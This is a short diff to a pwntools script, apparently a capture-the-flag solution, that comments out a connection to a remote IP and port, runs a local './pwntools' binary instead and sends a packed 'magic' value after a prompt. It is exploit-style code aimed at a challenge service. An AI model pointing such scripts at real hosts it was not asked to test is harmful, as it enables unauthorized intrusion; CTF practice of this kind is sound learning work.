@@ -9,7 +9,8 @@
 from pwn import *
 
 context.log_level = "debug"
-r = remote("140.110.112.29", 2113)
+# r = remote("140.110.112.29", 2113)
+r = process("./pwntools")
 
 r.recvuntil("Give me the magic :)\n")
 r.sendline(p32(0x79487ff))
